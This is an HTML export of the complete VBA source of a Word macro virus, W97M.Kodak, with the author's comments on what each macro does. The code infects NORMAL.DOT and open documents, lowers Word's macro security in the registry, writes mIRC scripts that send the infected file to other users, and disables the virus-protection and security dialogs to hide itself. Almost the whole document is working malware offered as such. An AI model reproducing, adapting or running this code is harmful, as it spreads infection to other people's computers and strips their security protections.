<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">' Name : W97M.Kodak
' Author : PetiK
' Date : June 5th 2001
' Size 3,030 bytes
'
' Macro AutoOpen : Create a “script.ini” file for mIRC. If the day is the 5th
' the virus display a Baloon Message. It copies itself to /Windows/Kodak.doc.
'
' Macro AutoClose : It alters the security in Word 9.0 and 10.0 (2000 and XP)
' It copies his code into the file “Kodak.vxd” and put it in the “NORMAL.DOT”.
' When a new file is create, the code of the macro is writes in this file.
' To avoid infect two times “NORMAL.DOT”, the virus adds the value :
'       HKEY_LOCAL_MACHINE\Software\Microsoft\W97M.Kodak = CliClac
'
' Macro HelpAbout : Display an other Baloon Message
'
' Macro ViewVBCode : Display a Message Box and shoxs Visual Basic Editor
'
' Macro ToolsOptions and Security : Find yourself.
</span><span class="sc0">

</span><span class="sc1">'W97M.Kodak by PetiK 05/10/2001
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">AutoOpen</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">ActiveDocument.SaveAs</span><span class="sc0"> </span><span class="sc7">FileName</span><span class="sc6">:=</span><span class="sc4">"C:\Windows\Kodak.doc"</span><span class="sc0">
</span><span class="sc7">ActiveDocument.Saved</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc4">"C:\script.drv"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Output</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"n0=on 1:JOIN:#:{"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"n1= /if ( $nick == $me ) { halt }"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"n2= /.dcc send $nick C:\Windows\Kodak.doc"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"n3=}"</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc7">FileSystem.FileCopy</span><span class="sc0"> </span><span class="sc4">"C:\script.drv"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"C:\mirc\script.ini"</span><span class="sc0">
</span><span class="sc7">FileSystem.FileCopy</span><span class="sc0"> </span><span class="sc4">"C:\script.drv"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"C:\mirc32\script.ini"</span><span class="sc0">
</span><span class="sc7">FileSystem.FileCopy</span><span class="sc0"> </span><span class="sc4">"C:\script.drv"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"C:\progra~1\mirc\script.ini"</span><span class="sc0">
</span><span class="sc7">FileSystem.FileCopy</span><span class="sc0"> </span><span class="sc4">"C:\script.drv"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"C:\progra~1\mirc32\script.ini"</span><span class="sc0">
</span><span class="sc7">FileSystem.Kill</span><span class="sc0"> </span><span class="sc4">"C:\script.drv"</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">With</span><span class="sc0"> </span><span class="sc7">Application.Assistant</span><span class="sc0">
    </span><span class="sc6">.</span><span class="sc7">Visible</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">With</span><span class="sc0">
</span><span class="sc3">With</span><span class="sc0"> </span><span class="sc7">Assistant.NewBalloon</span><span class="sc0">
    </span><span class="sc6">.</span><span class="sc7">Text</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"I am always here. And you, are you here."</span><span class="sc0">
    </span><span class="sc6">.</span><span class="sc7">Heading</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"W97M.Kodak"</span><span class="sc0">
    </span><span class="sc6">.</span><span class="sc7">Animation</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">msoAnimationGetAttentionMajor</span><span class="sc0">
    </span><span class="sc6">.</span><span class="sc7">Button</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">msoButtonSetOK</span><span class="sc0">
    </span><span class="sc6">.</span><span class="sc7">Show</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">With</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">AutoClose</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Level"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Level"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">&amp;</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Level"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Level"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">&amp;</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc4">"C:\Kodak.vxd"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbReadOnly</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc4">"C:\Kodak.vxd"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Output</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">MacroContainer.VBProject.VBComponents.Item</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">).</span><span class="sc7">CodeModule.CountOfLines</span><span class="sc0">
</span><span class="sc7">K</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">MacroContainer.VBProject.VBComponents.Item</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">).</span><span class="sc7">CodeModule.Lines</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">K</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc7">SetAttr</span><span class="sc0"> </span><span class="sc4">"C:\Kodak.vxd"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbReadOnly</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"W97M.Kodak"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"ClicClac"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">NormalTemplate.VBProject.VBComponents.Import</span><span class="sc0"> </span><span class="sc4">"C:\Kodak.vxd"</span><span class="sc0">
</span><span class="sc7">NormalTemplate.Save</span><span class="sc0">
</span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"W97M.Kodak"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"ClicClac"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">ActiveDocument.VBProject.VBComponents.Import</span><span class="sc0"> </span><span class="sc4">"C:\Kodak.vxd"</span><span class="sc0">
</span><span class="sc7">ActiveDocument.Save</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">HelpAbout</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">With</span><span class="sc0"> </span><span class="sc7">Application.Assistant</span><span class="sc0">
    </span><span class="sc6">.</span><span class="sc7">Visible</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">With</span><span class="sc0">
</span><span class="sc3">With</span><span class="sc0"> </span><span class="sc7">Assistant.NewBalloon</span><span class="sc0">
    </span><span class="sc6">.</span><span class="sc7">Text</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Smile and cheese for the photo"</span><span class="sc0">
    </span><span class="sc6">.</span><span class="sc7">Heading</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"W97M.Kodak"</span><span class="sc0">
    </span><span class="sc6">.</span><span class="sc7">Animation</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">msoAnimationGetAttentionMajor</span><span class="sc0">
    </span><span class="sc6">.</span><span class="sc7">Button</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">msoButtonSetOK</span><span class="sc0">
    </span><span class="sc6">.</span><span class="sc7">Show</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">With</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">ViewVBCode</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"was coded by PetiK(c)2001"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbInformation</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"W97M.Kodak"</span><span class="sc0">
</span><span class="sc7">ShowVisualBasicEditor</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">ToolsOptions</span><span class="sc6">()</span><span class="sc0">
    </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
    </span><span class="sc7">Options.VirusProtection</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc7">Options.SaveNormalPrompt</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc7">Dialogs</span><span class="sc6">(</span><span class="sc7">wdDialogToolsOptions</span><span class="sc6">).</span><span class="sc7">Show</span><span class="sc0">
    </span><span class="sc7">Options.VirusProtection</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc7">Options.SaveNormalPrompt</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">ToolsSecurity</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">CommandBars</span><span class="sc6">(</span><span class="sc4">"Macro"</span><span class="sc6">).</span><span class="sc7">Controls</span><span class="sc6">(</span><span class="sc4">"Security..."</span><span class="sc6">).</span><span class="sc7">Enabled</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc7">Dialogs</span><span class="sc6">(</span><span class="sc7">wdDialogToolsSecurity</span><span class="sc6">).</span><span class="sc7">Show</span><span class="sc0">
</span><span class="sc7">CommandBars</span><span class="sc6">(</span><span class="sc4">"Macro"</span><span class="sc6">).</span><span class="sc7">Controls</span><span class="sc6">(</span><span class="sc4">"Security..."</span><span class="sc6">).</span><span class="sc7">Enabled</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span></div></body>
</html>
